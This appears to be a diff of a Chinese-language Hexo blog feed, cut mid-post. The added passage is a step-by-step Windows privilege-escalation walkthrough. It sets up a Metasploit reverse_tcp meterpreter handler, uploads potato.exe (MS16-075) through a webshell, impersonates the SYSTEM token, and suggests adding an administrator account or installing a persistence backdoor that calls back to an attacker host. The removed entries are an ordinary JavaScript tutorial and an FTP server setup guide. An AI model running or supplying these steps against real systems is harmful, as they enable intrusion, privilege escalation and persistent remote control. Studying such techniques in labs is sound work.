class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use exploit/multi/handler</span><br><span class="line">meterpreter &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">meterpreter &gt; <span class="built_in">set</span> LHOST 192.233.23.23</span><br><span class="line">meterpreter &gt; <span class="built_in">set</span> LPORT 4433</span><br><span class="line">Exploit</span><br></pre></td></tr></table></figure></p><p><img src="http://opgnaclz6.bkt.clouddn.com/8.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>注：（如果反弹回来不是目标，则background再exploit）</p><h3 id="3，上传3306-exe程序到目标服务器及执行"><a href="#3，上传3306-exe程序到目标服务器及执行" class="headerlink" title="3，上传3306.exe程序到目标服务器及执行"></a>3，上传3306.exe程序到目标服务器及执行</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/9.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h3 id="4上传ms16-075文件"><a href="#4上传ms16-075文件" class="headerlink" title="4上传ms16-075文件"></a>4上传ms16-075文件</h3><p>通过webshll上传potato.exe文件，或者在msf下面执行命令上传：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /root/potato.exe C:\\inetpub\\wwwroot\\dede</span><br></pre></td></tr></table></figure></p><p>查看当前目录</p><p><img src="http://opgnaclz6.bkt.clouddn.com/10.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>如图：已经再当前目录就不需要跳转目录了，如果不是则<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\\inetpub\\wwwroot\\dede</span><br><span class="line">meterpreter &gt; use incognito</span><br></pre></td></tr></table></figure></p><p><img src="http://opgnaclz6.bkt.clouddn.com/11.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><p>如图已经返回SYSTEM了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">meterpreter &gt; execute -cH -f ./potato.exe</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; impersonate_token “NT AUTHORITY\\SYSTEM”</span><br></pre></td></tr></table></figure></p><p><img src="http://opgnaclz6.bkt.clouddn.com/12.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"><br>如图，第一次我执行NT AUTHORITY\SYSTEM失败了，因为少了一个/<br>meterpreter &gt; getuid<br>Server username: NT AUTHORITY\SYSTEM<br>得到SYSTEM后你可以进shell添加管理员账户密码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure></p><p>或者留下后门<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run?persistence?-X?-i?10?-p?6666?-r?192.168.163.129</span><br></pre></td></tr></table></figure></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;blockquote&gt;
+&lt;p&gt;目标IP:192.168.163.134&lt;br&gt;接收反弹的IP：192.168.163.129  //注意：必须是外网IP&lt;br&gt;本机IP：192.168.163.120&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&quot;1，在本机MSF框架执行
       
     
     </summary>
@@ -480,57 +522,6 @@
       <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
       <category term="XSS" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/XSS/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>javascript简单介绍</title>
-    <link href="http://yoursite.com/2017/09/27/JavaScript%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D/"/>
-    <id>http://yoursite.com/2017/09/27/JavaScript简单介绍/</id>
-    <published>2017-09-27T08:42:19.000Z</published>
-    <updated>2018-07-08T16:23:27.861Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="JavaScript介绍"><a href="#JavaScript介绍" class="headerlink" title="JavaScript介绍"></a>JavaScript介绍</h3><p>1，JavaScript用法：<br>HTML中的脚本必须位于<script></script>标签之间<br>脚本可放置在HTML页面的<head>和</head><body>部分里，但是为了不干扰页面通常放在<head>部分<br>javascript输出<br>a<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">document.write(&quot;&lt;p&gt;www.herly.me&lt;/p&gt;&quot;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">注：&lt;p&gt;是html标签，可以引用其它标签，也可以不用</span><br></pre></td></tr></table></figure></head></body></p><p>b<br>可以在目录新建个1.js，然后通过src的方式引入js文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;1.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>c<br>通过getElementById得到元素的id，innerHTML改变id的具体的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;p id=&quot;pid&quot;&gt;hello&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;pid&quot;).innerHTML=&quot;herly&quot;;</span><br><span class="line">&lt;/script &gt;</span><br></pre></td></tr></table></figure></p><h3 id="JavaScript语法"><a href="#JavaScript语法" class="headerlink" title="JavaScript语法"></a>JavaScript语法</h3><p>1,JavaScript语句向浏览器发出的命令。语句的作用是告诉浏览器该做什么<br>2,JavaScript对大小写非常敏感<br>3,JavaScript会忽略多余的空格<br>4,JavaScript标识符必须以字母，下划线或美元符号开始</p><h3 id="JavaScript标识符"><a href="#JavaScript标识符" class="headerlink" title="JavaScript标识符"></a>JavaScript标识符</h3><table><thead><tr><th>语句</th><th>描述</th></tr></thead><tbody><tr><td>break</td><td>用于跳出循环</td></tr><tr><td>catch</td><td>语句块，在 try 语句块执行出错时执行 catch 语句块</td></tr><tr><td>continue</td><td>跳过循环中的一个迭代</td></tr><tr><td>do … while</td><td>执行一个语句块，在条件语句为 true 时继续执行该语句块</td></tr><tr><td>for</td><td>在条件语句为 true 时，可以将代码块执行指定的次数</td></tr><tr><td>for … in</td><td>用于遍历数组或者对象的属性（对数组或者对象的属性进行循环操作）</td></tr><tr><td>function</td><td>定义一个函数</td></tr><tr><td>if … else</td><td>用于基于不同的条件来执行不同的动作</td></tr><tr><td>return</td><td>退出函数</td></tr><tr><td>switch</td><td>用于基于不同的条件来执行不同的动作</td></tr><tr><td>throw</td><td>抛出（生成）错误</td></tr><tr><td>try</td><td>实现错误处理，与 catch 一同使用</td></tr><tr><td>var</td><td>声明一个变量</td></tr><tr><td>while</td><td>当条件语句为 true 时，执行语句块</td></tr></tbody></table><h3 id="JavaScript运算符"><a href="#JavaScript运算符" class="headerlink" title="JavaScript运算符"></a>JavaScript运算符</h3><p>1,算数运算符：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ , - , * , % , / , ++ , --</span><br></pre></td></tr></table></figure></p><p>2,赋值运算符：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">= , += , -= , *= , /= , %=</span><br></pre></td></tr></table></figure></p><p>3,比较运算符：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">== , === , != , !== , &gt; , &lt; , &gt;= , &lt;=</span><br></pre></td></tr></table></figure></p><p>4,逻辑运算符:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp; , || , !</span><br></pre></td></tr></table></figure></p><p>5,条件运算符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var i = 11;</span><br><span class="line">document.write(i&gt;10?&quot;i大于10&quot;:&quot;i小于10&quot;)；</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>注：上述语句是判断i是否大于10，是的话输出“i大于10”否则输出“i小于10”</p><p>6,字符串的操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p id=&quot;sumid&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;button onclick=&quot;mysum()&quot;&gt;结果&lt;/button&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function mysum()</span><br><span class="line">&#123;</span><br><span class="line">var i =&quot;www.&quot;;</span><br><span class="line">var j =&quot;herly.me&quot;;</span><br><span class="line">var m =i+j;</span><br><span class="line">document.getElementById(&quot;sumid&quot;).innerHTML=m;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure></p><p>注：字符串用双引号包括，然后在赋值给变量</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;JavaScript介绍&quot;&gt;&lt;a href=&quot;#JavaScript介绍&quot; class=&quot;headerlink&quot; title=&quot;JavaScript介绍&quot;&gt;&lt;/a&gt;JavaScript介绍&lt;/h3&gt;&lt;p&gt;1，JavaScript用法：&lt;br&gt;HTML中的脚本必须位
-      
-    
-    </summary>
-    
-      <category term="编程开发" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
-    
-      <category term="javascript" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/javascript/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Linux安装FTP服务器</title>
-    <link href="http://yoursite.com/2017/09/05/Linux%E5%AE%89%E8%A3%85FTP%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
-    <id>http://yoursite.com/2017/09/05/Linux安装FTP服务器/</id>
-    <published>2017-09-05T08:42:19.000Z</published>
-    <updated>2018-07-15T15:41:22.464Z</updated>
-    
-    <content type="html"><![CDATA[<p>Rad Linux创建FTP服务器<br>由于渗透测试需要，所以在服务器搭建一个FTP服务器</p><h2 id="1-在创建FTP服务器之前输入命令："><a href="#1-在创建FTP服务器之前输入命令：" class="headerlink" title="1,在创建FTP服务器之前输入命令："></a>1,在创建FTP服务器之前输入命令：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef |grep vsftpd</span><br></pre></td></tr></table></figure><p>查一下系统有没有安装vsftpd这个服务器，如果出现如下图所示的界面说明没有安装。<br><img src="http://opgnaclz6.bkt.clouddn.com/111%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h2 id="2-然后再执行："><a href="#2-然后再执行：" class="headerlink" title="2,然后再执行："></a>2,然后再执行：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install vsftpd -y</span><br></pre></td></tr></table></figure><p>进行在线安装vsftpd这个服务。<br><img src="http://opgnaclz6.bkt.clouddn.com/222%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h2 id="3-安装成功以后需要把匿名登陆的这个功能关闭了。"><a href="#3-安装成功以后需要把匿名登陆的这个功能关闭了。" class="headerlink" title="3,安装成功以后需要把匿名登陆的这个功能关闭了。"></a>3,安装成功以后需要把匿名登陆的这个功能关闭了。</h2><p>使用命令:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/vsftpd/vsftpd.conf</span><br></pre></td></tr></table></figure></p><p>然后在里成找到：‍<br>anonymous_enable=NO<br><img src="http://opgnaclz6.bkt.clouddn.com/333%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h2 id="4-然后再查看一下vsftpd这个服务有没有启动。"><a href="#4-然后再查看一下vsftpd这个服务有没有启动。" class="headerlink" title="4,然后再查看一下vsftpd这个服务有没有启动。"></a>4,然后再查看一下vsftpd这个服务有没有启动。</h2><p>使用命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list</span><br></pre></td></tr></table></figure></p><p>如果你如下图所示一样没有启动。<br>没有启动使用启动：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --level 35 vsftpd on</span><br></pre></td></tr></table></figure></p><p><img src="http://opgnaclz6.bkt.clouddn.com/444%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h2 id="5-创建用户名和密码。"><a href="#5-创建用户名和密码。" class="headerlink" title="5,创建用户名和密码。"></a>5,创建用户名和密码。</h2><p>创建用户名：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd herly</span><br></pre></td></tr></table></figure></p><p>创建密码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd herly</span><br></pre></td></tr></table></figure></p><p><img src="http://opgnaclz6.bkt.clouddn.com/555%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h2 id="6-重启服务器-可以看到有ftp文件夹了，可以把要分享的放到这个文件夹了。"><a href="#6-重启服务器-可以看到有ftp文件夹了，可以把要分享的放到这个文件夹了。" class="headerlink" title="6,重启服务器,可以看到有ftp文件夹了，可以把要分享的放到这个文件夹了。"></a>6,重启服务器,可以看到有ftp文件夹了，可以把要分享的放到这个文件夹了。</h2><p><img src="http://opgnaclz6.bkt.clouddn.com/666%E6%8D%95%E8%8E%B7.PNG?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;Rad Linux创建FTP服务器&lt;br&gt;由于渗透测试需要，所以在服务器搭建一个FTP服务器&lt;/p&gt;
-&lt;h2 id=&quot;1-在创建FTP服务器之前输入命令：&quot;&gt;&lt;a href=&quot;#1-在创建FTP服务器之前输入命令：&quot; class=&quot;headerlink&quot; title=&quot;1,
-      
-    
-    </summary>
-    
-      <category term="杂七杂八" scheme="http://yoursite.com/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
-    
-      <category term="工具" scheme="http://yoursite.com/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/%E5%B7%A5%E5%85%B7/"/>
     
     
   </entry>
